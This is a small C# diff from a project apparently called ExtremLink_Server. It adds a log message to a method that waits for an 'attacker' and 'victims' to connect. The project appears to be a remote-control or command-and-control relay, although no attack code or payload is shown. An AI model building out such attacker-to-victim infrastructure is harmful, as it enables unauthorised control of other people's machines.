@@ -106,6 +106,7 @@ namespace ExtremLink_Server.Classes
         {
             // Input: Nothing.
             // Output: The function wait for clients (both attacker and victims) to connect to the server.
+            Log.LogInstance.AddMessage("🔗 Server waiting for connections...");
             Task.Run(() => this.ConnectToAttacker());
             Task.Run(() => this.ConnectToVictim());
         }
